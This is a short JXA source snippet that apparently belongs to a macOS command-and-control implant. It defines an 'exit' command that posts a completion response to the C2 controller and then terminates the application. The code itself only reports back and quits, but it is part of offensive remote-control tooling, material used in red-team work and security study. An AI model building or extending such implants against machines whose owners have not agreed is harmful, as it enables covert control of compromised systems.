exports.exit = function(task, command, params){
    C2.postResponse(task, convert_to_nsdata(JSON.stringify({"completed": true})));
    $.NSApplication.sharedApplication.terminate(this);
};
COMMAND_ENDS_HERE